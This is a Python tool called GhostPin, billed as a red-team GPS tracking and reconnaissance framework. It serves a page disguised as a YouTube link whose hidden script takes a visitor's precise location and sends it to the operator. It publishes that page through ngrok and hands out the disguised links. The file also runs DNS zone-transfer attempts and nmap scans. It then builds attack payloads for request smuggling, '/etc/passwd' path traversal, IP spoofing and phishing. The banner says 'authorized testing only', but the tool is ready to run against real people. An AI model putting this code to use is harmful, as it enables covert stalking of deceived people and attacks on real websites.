#!/usr/bin/env python3
#===============================================================================
# GhostPin - Chimera Framework
# Professional GPS Tracking & Reconnaissance for Red Team Operations
# Author: F1REW0LF
# License: MIT
#===============================================================================

import sys
import os
import re
import json
import time
import random
import base64
import hashlib
import socket
import threading
import signal
import ssl
import subprocess
import argparse
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor

# Third-party imports (with fallback)
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from flask import Flask, request, jsonify, redirect, render_template_string
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

#===============================================================================
# CONSTANTS & CONFIGURATION
#===============================================================================

VERSION = "10.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

#===============================================================================
# CORE ENGINE
#===============================================================================

class TargetProfile:
    """Dynamic target profile built from actual reconnaissance data"""
    
    def __init__(self, target: str):
        self.target = target
        self.ip_addresses = []
        self.domains = []
        self.technologies = {}
        self.open_ports = []
        self.services = {}
        self.vulnerability_hints = []
        self.network_structure = {}
        self.last_updated = time.time()
        self.cloud_resources = {}
        
    def update(self, data: Dict) -> None:
        for key, value in data.items():
            if hasattr(self, key):
                current = getattr(self, key)
                if isinstance(current, list) and isinstance(value, list):
                    setattr(self, key, list(set(current + value)))
                elif isinstance(current, dict) and isinstance(value, dict):
                    current.update(value)
                else:
                    setattr(self, key, value)
        self.last_updated = time.time()
    
    def to_dict(self) -> Dict:
        return {
            'target': self.target,
            'ip_addresses': self.ip_addresses,
            'domains': self.domains,
            'technologies': self.technologies,
            'open_ports': self.open_ports,
            'services': self.services,
            'vulnerability_hints': self.vulnerability_hints,
            'cloud_resources': self.cloud_resources,
            'last_updated': self.last_updated
        }

#===============================================================================
# RECONNAISSANCE MODULE
#===============================================================================

class ReconnaissanceEngine:
    """Intelligent reconnaissance with adaptive techniques"""
    
    def __init__(self, target: str):
        self.target = target
        self.profile = TargetProfile(target)
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.timeout = 10
        
    def full_recon(self) -> TargetProfile:
        """Execute comprehensive reconnaissance"""
        print(f"{Colors.BLUE}[*] Starting reconnaissance on {self.target}{Colors.WHITE}")
        
        # DNS enumeration
        self._dns_enumeration()
        
        # Port scanning (if nmap available)
        if NMAP_AVAILABLE:
            self._port_scan()
        
        # Technology fingerprinting
        self._technology_fingerprint()
        
        # Cloud enumeration
        self._cloud_enumeration()
        
        print(f"{Colors.GREEN}[+] Reconnaissance completed{Colors.WHITE}")
        return self.profile
    
    def _dns_enumeration(self) -> None:
        """DNS information gathering"""
        try:
            import dns.resolver
            
            records = {}
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
            
            for rtype in record_types:
                try:
                    answers = dns.resolver.resolve(self.target, rtype)
                    records[rtype] = [str(r) for r in answers]
                except:
                    pass
            
            # Zone transfer attempt
            try:
                ns_records = dns.resolver.resolve(self.target, 'NS')
                for ns in ns_records:
                    ns_ip = socket.gethostbyname(str(ns.target))
                    cmd = f"dig @{ns_ip} {self.target} AXFR"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=self.timeout)
                    if 'Transfer failed' not in result.stdout and result.returncode == 0:
                        records['zone_transfer'] = result.stdout
                        self.profile.vulnerability_hints.append('Zone transfer possible')
                        print(f"{Colors.YELLOW}[!] Zone transfer possible via {ns.target}{Colors.WHITE}")
            except:
                pass
            
            if records:
                self.profile.update({'technologies': {'dns': records}})
                
        except ImportError:
            pass
        except Exception as e:
            print(f"{Colors.DIM}[-] DNS enumeration error: {e}{Colors.WHITE}")
    
    def _port_scan(self) -> None:
        """Port scanning using nmap"""
        try:
            nm = nmap.PortScanner()
            nm.scan(self.target, arguments='-T4 -F --open')
            
            ports = []
            services = {}
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        port_info = nm[host][proto][port]
                        ports.append(port)
                        services[port] = {
                            'name': port_info.get('name', 'unknown'),
                            'state': port_info.get('state', 'unknown'),
                            'product': port_info.get('product', ''),
                            'version': port_info.get('version', '')
                        }
            
            self.profile.open_ports = ports
            self.profile.services = services
            
            if ports:
                print(f"{Colors.GREEN}[+] Open ports: {', '.join(map(str, ports))}{Colors.WHITE}")
                
        except Exception as e:
            print(f"{Colors.DIM}[-] Port scan error: {e}{Colors.WHITE}")
    
    def _technology_fingerprint(self) -> None:
        """Detect technologies and frameworks"""
        techs = {}
        
        try:
            # HTTP fingerprint
            protocols = ['https', 'http']
            for proto in protocols:
                try:
                    url = f"{proto}://{self.target}"
                    resp = requests.get(url, timeout=self.timeout, verify=False)
                    
                    headers = resp.headers
                    techs['headers'] = dict(headers)
                    
                    # Detect server
                    server = headers.get('Server', '')
                    if server:
                        techs['server'] = server
                    
                    # Detect framework from headers
                    x_powered = headers.get('X-Powered-By', '')
                    if x_powered:
                        techs['framework'] = x_powered
                    
                    break
                except:
                    continue
                    
        except:
            pass
        
        if techs:
            self.profile.update({'technologies': techs})
            print(f"{Colors.GREEN}[+] Detected technologies: {', '.join(techs.keys())}{Colors.WHITE}")
    
    def _cloud_enumeration(self) -> None:
        """Detect cloud resources"""
        cloud_data = {}
        
        cloud_patterns = {
            'aws': ['amazonaws.com', 's3.', 'ec2.', 'elb.', 'aws'],
            'gcp': ['googleapis.com', 'appspot.com', 'cloudfunctions', 'gcp'],
            'azure': ['azurewebsites.net', 'azure.com', 'cloudapp.net', 'azure']
        }
        
        for provider, patterns in cloud_patterns.items():
            for pattern in patterns:
                if pattern in self.target:
                    cloud_data[provider] = {'detected': True, 'pattern': pattern}
                    break
        
        if cloud_data:
            self.profile.cloud_resources = cloud_data
            print(f"{Colors.GREEN}[+] Cloud resources: {', '.join(cloud_data.keys())}{Colors.WHITE}")

#===============================================================================
# EXPLOITATION ENGINE
#===============================================================================

class ExploitationEngine:
    """Dynamic exploitation without hardcoded scenarios"""
    
    def __init__(self, profile: TargetProfile):
        self.profile = profile
        self.attack_chain = []
        
    def build_attack_chain(self) -> List[Dict]:
        """Build attack chain based on target profile"""
        chain = []
        
        # Analyze technologies for attack vectors
        techs = self.profile.technologies
        
        # HTTP-based attacks
        if 'server' in techs:
            server = techs['server'].lower()
            
            if 'nginx' in server:
                chain.append({
                    'technique': 'HTTP Request Smuggling',
                    'payload': self._generate_smuggling_payload(),
                    'preconditions': ['CL.TE', 'TE.CL']
                })
            
            if 'apache' in server:
                chain.append({
                    'technique': 'Path Traversal',
                    'payload': self._generate_path_traversal(),
                    'preconditions': ['mod_rewrite']
                })
        
        # Port-based attacks
        if 80 in self.profile.open_ports or 443 in self.profile.open_ports:
            chain.append({
                'technique': 'Web Application Attack',
                'payload': self._generate_web_payload(),
                'preconditions': ['web_service']
            })
        
        # Cloud-specific attacks
        if self.profile.cloud_resources:
            chain.append({
                'technique': 'Cloud Resource Exploitation',
                'payload': self._generate_cloud_payload(),
                'preconditions': ['cloud_service']
            })
        
        # Always include social engineering as fallback
        chain.append({
            'technique': 'Social Engineering',
            'payload': self._generate_se_payload(),
            'preconditions': ['human_factor']
        })
        
        self.attack_chain = chain
        return chain
    
    def _generate_smuggling_payload(self) -> Dict:
        """Generate HTTP smuggling payload"""
        import random
        import string
        
        chunk_size = random.randint(10, 30)
        chunk_data = ''.join(random.choices(string.ascii_lowercase, k=chunk_size))
        
        return {
            'method': 'POST',
            'headers': {
                'Content-Length': str(random.randint(100, 300)),
                'Transfer-Encoding': 'chunked',
                'X-Forwarded-For': self._spoof_ip()
            },
            'body': f"{chunk_size:x}\r\n{chunk_data}\r\n0\r\n\r\n"
        }
    
    def _generate_path_traversal(self) -> Dict:
        """Generate path traversal payload"""
        return {
            'method': 'GET',
            'path': f"/../../../../etc/passwd?{random.randint(1000, 9999)}",
            'headers': {
                'Accept': '*/*',
                'X-Original-URL': '/admin'
            }
        }
    
    def _generate_web_payload(self) -> Dict:
        """Generate web application payload"""
        import random
        import string
        
        return {
            'method': 'POST',
            'endpoint': '/api/v1/track',
            'headers': {
                'Content-Type': 'application/json',
                'X-Request-ID': ''.join(random.choices(string.hexdigits, k=16))
            },
            'body': {
                'data': base64.b64encode(b'test_payload').decode(),
                'timestamp': time.time()
            }
        }
    
    def _generate_cloud_payload(self) -> Dict:
        """Generate cloud exploitation payload"""
        return {
            'technique': 'Misconfiguration Exploitation',
            'payload': {
                'bucket': 'test-bucket',
                'action': 'list_objects',
                'region': 'us-east-1'
            }
        }
    
    def _generate_se_payload(self) -> Dict:
        """Generate social engineering payload"""
        return {
            'technique': 'Phishing',
            'payload': {
                'url': f"https://{self.profile.target}/login",
                'redirect': 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                'message': 'Please verify your account'
            }
        }
    
    def _spoof_ip(self) -> str:
        """Generate spoofed IP address"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

#===============================================================================
# TRACKING SERVER
#===============================================================================

class TrackingServer:
    """GPS tracking server with HTTPS support"""
    
    def __init__(self):
        self.tracking_data = []
        self.lock = threading.Lock()
        self.port = 443
        self.thread = None
        self.running = False
        self.public_url = None
        
    def start(self, port: int = 443, ssl_enabled: bool = True) -> bool:
        """Start the tracking server"""
        self.port = port
        self.running = True
        
        if not FLASK_AVAILABLE:
            print(f"{Colors.RED}[!] Flask not installed. Install: pip install flask{Colors.WHITE}")
            return False
        
        # Generate SSL certificate if needed
        cert_file = 'server.crt'
        key_file = 'server.key'
        
        if ssl_enabled and (not os.path.exists(cert_file) or not os.path.exists(key_file)):
            try:
                subprocess.run([
                    'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
                    '-nodes', '-out', cert_file, '-keyout', key_file,
                    '-days', '365', '-subj', '/CN=localhost'
                ], capture_output=True, check=True)
                print(f"{Colors.GREEN}[+] SSL certificate generated{Colors.WHITE}")
            except:
                print(f"{Colors.YELLOW}[!] SSL generation failed, using HTTP{Colors.WHITE}")
                ssl_enabled = False
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return redirect('https://www.youtube.com')
        
        @app.route('/watch')
        def watch():
            video_id = request.args.get('v', 'dQw4w9WgXcQ')
            
            html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v={video_id}">
<title>YouTube</title>
<style>
body{{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background:#f9f9f9}}
.spinner{{width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #ff0000;border-radius:50%;animation:spin 0.8s linear infinite}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
<script>
(function() {{
    var token = Math.random().toString(36).substring(2, 10);
    var sent = false;
    
    function sendLocation(pos) {{
        if (sent) return;
        sent = true;
        var data = {{
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
        }};
        fetch('/track/' + token, {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(data)
        }}).catch(function() {{}});
    }}
    
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(sendLocation, function() {{}}, {{
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }});
    }}
    
    setTimeout(function() {{
        window.location.href = 'https://www.youtube.com/watch?v={video_id}';
    }}, 100);
}})();
</script>
</head>
<body>
<div class="spinner"></div>
</body>
</html>'''
            return html
        
        @app.route('/track/<token>', methods=['POST'])
        def track(token):
            data = request.get_json()
            if data:
                with self.lock:
                    data['token'] = token
                    data['received_at'] = datetime.now().isoformat()
                    data['source_ip'] = request.remote_addr
                    self.tracking_data.append(data)
                print(f"{Colors.GREEN}[+] GPS: {data.get('lat')}, {data.get('lng')} ({token}){Colors.WHITE}")
            return jsonify({'status': 'ok'})
        
        @app.route('/data')
        def get_data():
            with self.lock:
                return jsonify(self.tracking_data)
        
        @app.route('/clear')
        def clear_data():
            with self.lock:
                self.tracking_data.clear()
            return jsonify({'status': 'cleared'})
        
        def run():
            if ssl_enabled and os.path.exists(cert_file) and os.path.exists(key_file):
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False, ssl_context=(cert_file, key_file))
            else:
                app.run(host='0.0.0.0', port=port, debug=False, threaded=True, use_reloader=False)
        
        self.thread = threading.Thread(target=run, daemon=True)
        self.thread.start()
        time.sleep(1)
        
        protocol = "https" if ssl_enabled else "http"
        print(f"{Colors.GREEN}[+] Server running on port {port} ({protocol}){Colors.WHITE}")
        
        return True
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

#===============================================================================
# NGROK MANAGER
#===============================================================================

class NgrokManager:
    """Manage ngrok tunnel for public access"""
    
    def __init__(self):
        self.process = None
        self.public_url = None
        self.port = 443
        
    def start(self, port: int = 443) -> Optional[str]:
        """Start ngrok tunnel"""
        self.port = port
        
        try:
            subprocess.run(['ngrok', '--version'], capture_output=True, check=True)
        except:
            print(f"{Colors.RED}[!] ngrok not installed. Install from https://ngrok.com/download{Colors.WHITE}")
            return None
        
        print(f"{Colors.BLUE}[*] Starting ngrok tunnel...{Colors.WHITE}")
        
        try:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
            time.sleep(1)
            
            self.process = subprocess.Popen(
                ['ngrok', 'http', str(port), '--log=stdout'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            try:
                import requests
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    for tunnel in data.get('tunnels', []):
                        if tunnel.get('proto') == 'https':
                            self.public_url = tunnel.get('public_url')
                            print(f"{Colors.GREEN}[+] Public URL: {self.public_url}{Colors.WHITE}")
                            return self.public_url
            except:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[!] ngrok failed: {e}{Colors.WHITE}")
            return None
    
    def stop(self):
        if self.process:
            self.process.terminate()
            self.process.wait(timeout=5)
        else:
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)

#===============================================================================
# STEALTH ENGINE
#===============================================================================

class StealthEngine:
    """Dynamic masquerade and evasion techniques"""
    
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
        ]
        
    def random_ua(self) -> str:
        """Get random User-Agent"""
        return random.choice(self.user_agents)
    
    def spoof_ip(self) -> str:
        """Generate spoofed IP"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    def generate_fingerprint(self) -> str:
        """Generate unique fingerprint"""
        return hashlib.md5(f"{time.time()}{random.randint(1,999999)}".encode()).hexdigest()[:16]
    
    def jitter_delay(self, base: int = 30) -> float:
        """Add jitter to delay"""
        return base * (1 + random.uniform(-0.3, 0.3))

#===============================================================================
# MAIN APPLICATION
#===============================================================================

class GhostPin:
    """Main application class"""
    
    def __init__(self):
        self.server = TrackingServer()
        self.ngrok = NgrokManager()
        self.stealth = StealthEngine()
        self.running = True
        self.public_url = None
        
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        print(f"\n{Colors.RED}[!] Shutting down...{Colors.WHITE}")
        self.running = False
        if self.server:
            self.server.stop()
        if self.ngrok:
            self.ngrok.stop()
        sys.exit(0)
    
    def _banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██████╗ ██╗███╗   ██╗
    ██╔════╝██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██║████╗  ██║
    ██║     ███████║██║   ██║███████╗   ██║   ██████╔╝██║██╔██╗ ██║
    ██║     ██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██║██║╚██╗██║
    ╚██████╗██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║██║ ╚████║
     ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
{Colors.WHITE}
{Colors.YELLOW}    Professional GPS Tracking Framework v{VERSION}{Colors.WHITE}
{Colors.DIM}    Author: {AUTHOR} | License: {LICENSE}{Colors.WHITE}
{Colors.RED}    [+] For authorized security testing only{Colors.WHITE}
"""
        print(banner)
    
    def _menu(self):
        print(f"""
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.BOLD}GhostPin v{VERSION} - Chimera Framework{Colors.WHITE}
{Colors.CYAN}Professional GPS Tracking & Reconnaissance{Colors.WHITE}
{Colors.BLUE}{'='*55}{Colors.WHITE}
{Colors.GREEN}[1]{Colors.WHITE} Start Tracking Server
{Colors.GREEN}[2]{Colors.WHITE} Start ngrok Tunnel (Public)
{Colors.GREEN}[3]{Colors.WHITE} Generate Tracking Link
{Colors.GREEN}[4]{Colors.WHITE} View Tracking Data
{Colors.GREEN}[5]{Colors.WHITE} Run Reconnaissance
{Colors.GREEN}[6]{Colors.WHITE} Build Attack Chain
{Colors.GREEN}[7]{Colors.WHITE} Clear Data
{Colors.RED}[8]{Colors.WHITE} Exit
""")
    
    def _recon_mode(self):
        target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
        if not target:
            return
        
        recon = ReconnaissanceEngine(target)
        profile = recon.full_recon()
        
        print(f"\n{Colors.GREEN}[+] Reconnaissance Results:{Colors.WHITE}")
        print(json.dumps(profile.to_dict(), indent=2))
        
        # Save to file
        with open(f"recon_{target}_{int(time.time())}.json", 'w') as f:
            json.dump(profile.to_dict(), f, indent=2)
        print(f"{Colors.GREEN}[+] Results saved to recon_{target}_{int(time.time())}.json{Colors.WHITE}")
    
    def _attack_chain(self):
        target = input(f"{Colors.CYAN}[>] Target domain/IP: {Colors.WHITE}").strip()
        if not target:
            return
        
        recon = ReconnaissanceEngine(target)
        profile = recon.full_recon()
        
        exploit = ExploitationEngine(profile)
        chain = exploit.build_attack_chain()
        
        print(f"\n{Colors.GREEN}[+] Attack Chain ({len(chain)} vectors):{Colors.WHITE}")
        for i, vector in enumerate(chain, 1):
            print(f"\n{Colors.YELLOW}[{i}] {vector.get('technique', 'Unknown')}{Colors.WHITE}")
            print(f"    Preconditions: {', '.join(vector.get('preconditions', []))}")
            print(f"    Payload: {json.dumps(vector.get('payload', {}), indent=4)}")
        
        # Save to file
        with open(f"attack_chain_{target}_{int(time.time())}.json", 'w') as f:
            json.dump(chain, f, indent=2)
        print(f"\n{Colors.GREEN}[+] Attack chain saved to attack_chain_{target}_{int(time.time())}.json{Colors.WHITE}")
    
    def run(self):
        """Main application loop"""
        self._banner()
        
        print(f"{Colors.BLUE}[*] GhostPin v{VERSION} initialized{Colors.WHITE}")
        print(f"{Colors.DIM}[*] Type 'help' for commands or use menu options{Colors.WHITE}")
        
        while self.running:
            self._menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                port = int(input(f"{Colors.CYAN}[>] Port (443): {Colors.WHITE}").strip() or "443")
                ssl = input(f"{Colors.CYAN}[>] Enable HTTPS? (Y/n): {Colors.WHITE}").strip().lower() != 'n'
                self.server.start(port, ssl)
            
            elif choice == '2':
                if self.public_url:
                    print(f"{Colors.GREEN}[+] ngrok already running: {self.public_url}{Colors.WHITE}")
                    continue
                
                port = int(input(f"{Colors.CYAN}[>] Server port (443): {Colors.WHITE}").strip() or "443")
                self.public_url = self.ngrok.start(port)
                
                if self.public_url:
                    print(f"{Colors.GREEN}[+] Public HTTPS URL: {self.public_url}{Colors.WHITE}")
            
            elif choice == '3':
                video_id = input(f"{Colors.CYAN}[>] Video ID (default: random): {Colors.WHITE}").strip()
                if not video_id:
                    video_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=11))
                
                protocol = "https" if os.path.exists('server.crt') else "http"
                local_url = f"{protocol}://localhost:{self.server.port}/watch?v={video_id}"
                
                print(f"\n{Colors.GREEN}[+] Tracking Links:{Colors.WHITE}")
                print(f"  {Colors.CYAN}Local:{Colors.WHITE} {local_url}")
                
                if self.public_url:
                    public_url = f"{self.public_url}/watch?v={video_id}"
                    print(f"  {Colors.CYAN}Public:{Colors.WHITE} {public_url}")
                    print(f"  {Colors.DIM}(HTTPS - Trusted by browsers){Colors.WHITE}")
                else:
                    print(f"  {Colors.YELLOW}Public: Start ngrok first (option 2){Colors.WHITE}")
            
            elif choice == '4':
                data = self.server.tracking_data
                if not data:
                    print(f"{Colors.YELLOW}[!] No data yet{Colors.WHITE}")
                    continue
                
                print(f"\n{Colors.GREEN}[+] Tracking Data ({len(data)} records):{Colors.WHITE}")
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    ts = record.get('received_at', 'N/A')
                    ip = record.get('source_ip', 'N/A')
                    
                    print(f"\n  {Colors.YELLOW}[{i}] Token:{Colors.WHITE} {token}")
                    print(f"      Location: {Colors.CYAN}{lat}, {lng}{Colors.WHITE}")
                    print(f"      IP: {Colors.DIM}{ip}{Colors.WHITE}")
                    print(f"      Time: {Colors.DIM}{ts}{Colors.WHITE}")
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps = f"https://www.google.com/maps?q={lat},{lng}"
                        print(f"      Map: {Colors.BLUE}{maps}{Colors.WHITE}")
            
            elif choice == '5':
                self._recon_mode()
            
            elif choice == '6':
                self._attack_chain()
            
            elif choice == '7':
                self.server.tracking_data.clear()
                print(f"{Colors.GREEN}[+] Data cleared{Colors.WHITE}")
            
            elif choice == '8':
                print(f"{Colors.YELLOW}[*] Shutting down...{Colors.WHITE}")
                self.running = False
                self.server.stop()
                if self.ngrok:
                    self.ngrok.stop()
                print(f"{Colors.GREEN}[+] Goodbye!{Colors.WHITE}")
                sys.exit(0)
            
            else:
                print(f"{Colors.RED}[-] Invalid option{Colors.WHITE}")

#===============================================================================
# COMMAND LINE INTERFACE
#===============================================================================

def main():
    parser = argparse.ArgumentParser(
        description=f"GhostPin v{VERSION} - Professional GPS Tracking Framework",
        epilog=f"Author: {AUTHOR} | License: {LICENSE}"
    )
    
    parser.add_argument("--server", action="store_true", help="Start tracking server")
    parser.add_argument("--port", type=int, default=443, help="Server port")
    parser.add_argument("--no-ssl", action="store_true", help="Disable HTTPS")
    parser.add_argument("--ngrok", action="store_true", help="Start ngrok tunnel")
    parser.add_argument("--recon", help="Run reconnaissance on target")
    parser.add_argument("--attack", help="Build attack chain for target")
    parser.add_argument("--video", help="YouTube video ID for tracking link")
    parser.add_argument("--output", help="Output file for results")
    
    args = parser.parse_args()
    
    # Server mode
    if args.server:
        print(f"{Colors.BLUE}[*] Starting GhostPin server...{Colors.WHITE}")
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        
        if args.ngrok:
            ngrok = NgrokManager()
            url = ngrok.start(args.port)
            if url:
                print(f"{Colors.GREEN}[+] Public URL: {url}{Colors.WHITE}")
        
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.WHITE}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            if args.ngrok:
                ngrok.stop()
        sys.exit(0)
    
    # Reconnaissance mode
    if args.recon:
        recon = ReconnaissanceEngine(args.recon)
        profile = recon.full_recon()
        
        output = args.output or f"recon_{args.recon}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(profile.to_dict(), f, indent=2)
        print(f"{Colors.GREEN}[+] Results saved to {output}{Colors.WHITE}")
        sys.exit(0)
    
    # Attack chain mode
    if args.attack:
        recon = ReconnaissanceEngine(args.attack)
        profile = recon.full_recon()
        
        exploit = ExploitationEngine(profile)
        chain = exploit.build_attack_chain()
        
        output = args.output or f"attack_{args.attack}_{int(time.time())}.json"
        with open(output, 'w') as f:
            json.dump(chain, f, indent=2)
        print(f"{Colors.GREEN}[+] Attack chain saved to {output}{Colors.WHITE}")
        
        # Display summary
        print(f"\n{Colors.GREEN}[+] Attack Vectors ({len(chain)}):{Colors.WHITE}")
        for i, vector in enumerate(chain, 1):
            print(f"  {Colors.YELLOW}{i}.{Colors.WHITE} {vector.get('technique', 'Unknown')}")
        sys.exit(0)
    
    # Generate tracking link
    if args.video:
        server = TrackingServer()
        server.start(args.port, ssl_enabled=not args.no_ssl)
        
        protocol = "https" if not args.no_ssl and os.path.exists('server.crt') else "http"
        link = f"{protocol}://localhost:{args.port}/watch?v={args.video}"
        
        print(f"\n{Colors.GREEN}[+] Tracking Link: {link}{Colors.WHITE}")
        
        if args.ngrok:
            ngrok = NgrokManager()
            url = ngrok.start(args.port)
            if url:
                public_link = f"{url}/watch?v={args.video}"
                print(f"{Colors.GREEN}[+] Public Link: {public_link}{Colors.WHITE}")
        
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.WHITE}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
        sys.exit(0)
    
    # Interactive mode (default)
    if not any(vars(args).values()):
        tool = GhostPin()
        tool.run()

#===============================================================================
# ENTRY POINT
#===============================================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted{Colors.WHITE}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.WHITE}")
        sys.exit(1)
